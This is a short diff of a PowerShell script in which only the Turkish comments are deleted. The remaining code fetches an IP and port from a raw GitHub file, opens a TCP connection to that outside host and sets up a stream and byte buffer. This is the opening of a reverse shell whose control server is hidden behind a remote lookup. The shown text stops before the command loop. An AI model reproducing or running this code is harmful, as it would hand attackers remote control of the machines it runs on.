@@ -1,17 +1,9 @@
-# Bağlantı linkini belirle
 $url = "https://raw.githubusercontent.com/jmfjlkelmf/oerb/main/rotg"
-
-# Web içeriğini al
 $response = Invoke-WebRequest -Uri $url
-
-# İçerikten IP ve portu ayır
-# Örneğin, içerik "192.168.1.2:55" gibi bir string döndürüyor olsun.
 $content = $response.Content.Trim()
 $parts = $content -split ':'
 $server = $parts[0]
 $port = [int]$parts[1]
-
-# TCP Client'i IP ve Port ile başlat
 $client = New-Object System.Net.Sockets.TCPClient($server, $port)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
